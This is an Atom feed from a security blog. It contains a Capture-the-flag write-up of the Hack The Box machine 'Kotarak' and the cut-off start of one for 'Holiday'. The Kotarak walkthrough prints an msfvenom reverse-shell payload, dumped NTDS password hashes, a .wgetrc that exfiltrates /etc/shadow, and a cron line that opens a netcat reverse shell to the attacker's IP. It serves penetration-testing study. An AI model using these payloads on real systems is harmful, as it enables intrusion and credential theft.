<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-29T23:46:51+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Kotarak - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-kotarak/" rel="alternate" type="text/html" title="Kotarak - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-kotarak</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-kotarak/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator’s hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can perform a SSRF through a website’s browsable from for retrieving the credentials for Tomcat.&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website and upload a reverse shell.&lt;/li&gt;
  &lt;li&gt;With secretsdump.py from impacket tools we can retrieve the Administrator’s hash password to elevate as Atanas.&lt;/li&gt;
  &lt;li&gt;A crontab from another subnet allows us to detect a vulnerable version of wget on the machine in the subnet and on the local machine.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 3 open TCP ports:  22 SSH, 8009 Apache Jserv and 8080 Apache Tomcat&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:35 CEST
Nmap scan report for 10.10.10.55
Host is up (0.051s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -T4 -p- 10.10.10.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:39 CEST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 84.75% done; ETC: 23:39 (0:00:03 remaining)
Nmap scan report for 10.10.10.55
Host is up (0.054s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;http-recon&quot;&gt;HTTP Recon&lt;/h2&gt;

&lt;p&gt;We get a 404 error if we try to connect on the ip with the 8080 tomcat tcp port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the 60000 tcp open port instead we can able to connect on the website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;server-side-request-forgery&quot;&gt;Server Side Request Forgery&lt;/h2&gt;

&lt;p&gt;Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;capturing the request for private browsing through the browser provided by the website with burpsuite, we can notice a rather curious form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Testing the form with sqlmap it appears not vulnerable to sql injections. But by trying an SSRF attack we discover the magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can request remote resources, in this case the tomcat page hosted on port 8080 by the webserver. Unfortunately, by trying to request remote files, we don’t have the same luck. So we can see if the remote server has other resources available on other ports that only himself reaches:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo examples -&amp;gt; wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload                                         
===================================================================

000000022:   200        4 L      4 W      62 Ch       &quot;22&quot;                                            
000000090:   200        11 L     18 W     156 Ch      &quot;90&quot;                                            
000000110:   200        17 L     24 W     187 Ch      &quot;110&quot;                                           
000000200:   200        3 L      2 W      22 Ch       &quot;200&quot;                                           
000000320:   200        26 L     109 W    1232 Ch     &quot;320&quot;                                           
000000888:   200        78 L     265 W    3955 Ch     &quot;888&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To speed up this step, the interesting door is the 888:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can ask the server to show us the backup file on port 888:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only CTF like part that we could find in this machine. Obviously I don’t reserve any criticism because the box was really well made and full of new stuff to learn. Let’s authenticate to tomcat now!&lt;/p&gt;

&lt;h2 id=&quot;tomcat-recon&quot;&gt;Tomcat Recon&lt;/h2&gt;

&lt;p&gt;Browsing the page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.55:8080/manager/html&lt;/code&gt; a window will appear and we can enter the credentials just found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The cool thing is that we can deploy a file with the WAR web archive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And since tomcat can interpret java, we are going to create a reverse shell in java with msfvenom:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f war &amp;gt; /root/Documenti/kotarak/shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And finally we will trigger it through the broswer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 38164
id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat
/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-atanas&quot;&gt;PrivEsc to Atanas&lt;/h2&gt;

&lt;p&gt;There is an user called Atanas in the system:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
atanas:x:1000:1000:atanas,,,:/home/atanas:/bin/bash
tomcat:x:1001:1001::/opt/tomcat:/bin/false
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
lxc-dnsmasq:x:112:119:LXC dnsmasq,,,:/var/lib/lxc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And after a bit of enumeration of the file system, in the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/tomcat/to_archive/pentest_data&lt;/code&gt; we find a couple of interesting files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /home
$ cd tomcatt
$ cd to_archive
$ cd pentest_data
$ ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dit&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bin&lt;/code&gt; file are look to be AD database files.&lt;/p&gt;

&lt;h2 id=&quot;what-is-the-file-ntdsdit&quot;&gt;What is the file ntds.dit?&lt;/h2&gt;

&lt;p&gt;The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.&lt;/p&gt;

&lt;p&gt;To use the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; from impacket to dump the hashes, we need to download the files to our machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; download 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
[*] download   : 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -&amp;gt; 20170721114636_default_192.168.110.133_psexec.ntdsg
meterpreter &amp;gt; download 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
[*] download   : 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -&amp;gt; 20170721114637_default_192.168.110.133_psexec.ntdsg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s rename the files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; ls
ntds.bin
ntds.dit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we dump the content with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; tool:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; impacket-secretsdump -ntds ntds.dit -system ntds.bin LOCAL
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The hash that we need to elevate to Atanos is that of the administrator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f16tomcat!&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ su atanas
su atanas
Password: f16tomcat!

atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ cat /home/atanas/user.txt
&amp;lt;mcat/to_archive/pentest_data$ cat /home/atanas/user.txt                     
93f844f50491ef797c9c1b601b4bece8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;

&lt;p&gt;Browsing the file system with Atanas, we notice two singularly interesting things:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ ls
app.log  flag.txt
atanas@kotarak-dmz:/root$ cat flag.txt
Getting closer! But what you are looking for can't be found here.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this one:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;App.log is as it gives us some of information: It shows that an IP of 10.0.3.133 utilises GET every 2 minutes to call a file called archive.tar.gz and the vulnerable version of wget. When looking at the content of ifconfig, it shows that we are also connected to the 10.0.3.0/24 network via a LXC bridge port with the IP address of 10.0.3.1, this indicates that the 10.0.3.133 is running in an LXC container with a vulnerable version of wget.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets also check the wget version of our machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ wget -V
GNU Wget 1.17.1 built on linux-gnu.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our version of wget is also vulnerable!&lt;/p&gt;

&lt;h2 id=&quot;wget-exploiting&quot;&gt;Wget exploiting&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.exploit-db.com/exploits/40064&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Wget &amp;lt; 1.18 when supplied with a malicious URL (to a malicious or compromised web server) can be tricked into saving an arbitrary remote file supplied by an attacker, with arbitrary contents and filename under the current directory and possibly other directories by writing to .wgetrc.&lt;/p&gt;

&lt;p&gt;First, let’s collect both .wgetrc and exploit.py files:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; ls -lah
totale 16K
drwxr-xr-x 2 root root 4,0K apr 29 05:25 .
drwxr-xr-x 3 root root 4,0K apr 29 01:56 ..
-rw-r--r-- 1 root root 2,8K apr 29 02:31 exp.py
-rw-r--r-- 1 root root   70 apr 29 02:13 .wgetrc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;let’s adapt them to the our case:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo exp -&amp;gt; cat .wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And copy the exploit.py script from the exploit-db page to our machine and edit it accordingly::&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ROOT_CRON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;* * * * * root rm /tmp/i;mkfifo /tmp/i;cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need to install and run the python ftp with this command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install pyftpdlib&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Download the exploit.py previously adapted to our case in the remote machine, and run it with this command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atanas@kotarak-dmz:/root$ authbind python exp.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.27:21. Let's go then

Serving wget exploit on port 80...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Any port below 1024 requires root access to run unless authbind is used. Authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. Authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.&lt;/p&gt;

&lt;p&gt;And when the crontab run (every two minutes) we will get back our root reverse shell!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 45718
/bin/sh: 0: can't access tty: job control turned off
# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat root/root.txt
uid=0(root) gid=0(root) groups=0(root)
root950d1425795dfd38272c93ccbb63ae2c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-for-fun-and-learning-not-for-profit&quot;&gt;Hack for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;Unfortunately we getting a root shell inside another machine, and the user Atanas can’t edit the webserver files owned by root!&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Kotarak" /><category term="SSRF" /><category term="NTDS files" /><category term="WGET Vulnerable" /><summary type="html">Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator's hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.</summary></entry><entry><title type="html">Holiday - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-holiday/" rel="alternate" type="text/html" title="Holiday - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-holiday</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-holiday/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can perform a SQL injection through a login form  retrieving the credentials.&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website and perform an XSS Stored bypassing the filters.&lt;/li&gt;
  &lt;li&gt;With a command injection and the appropriate regex bypass through a form, allow us to get a reverse shell.&lt;/li&gt;
  &lt;li&gt;Sudo -l allow us to install a malicious json package with npm.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 8000 Node.js Express Framework.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 16:08 CEST
Nmap scan report for 10.10.10.25
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;recon-http&quot;&gt;Recon HTTP&lt;/h2&gt;

&lt;p&gt;If we can try to connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.25:8000&lt;/code&gt; we will see just an image on the web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we can try to bruteforce the directories with dirsearch:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo dirsearch -&amp;gt; ./dirsearch.py -u 10.10.10.25:8000 -w /usr/share/dirb/wordlists/small.txt -e php,html,txt,css,js,xml

 _|. _ _  _  _  _ _|_    v0.3.9
